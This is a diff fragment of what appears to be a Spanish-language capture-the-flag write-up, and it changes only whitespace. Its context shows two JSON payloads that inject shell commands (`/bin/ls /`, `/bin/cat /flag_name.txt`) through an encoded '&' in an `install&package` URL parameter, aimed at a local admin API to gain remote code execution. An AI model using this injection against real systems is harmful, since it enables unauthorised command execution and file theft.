@@ -246,7 +246,6 @@ El archivo `api.js` revela los endpoints de la API: `/api/admin` y `/api/admin/h
 ```
 
 `install&package` se explota rompiendo con =$%26 para conseguir RCE:
-
 ```json
 {"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package=$%26/bin/ls%20/"}
 {"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package=$%26/bin/cat%20/flag_name.txt"}
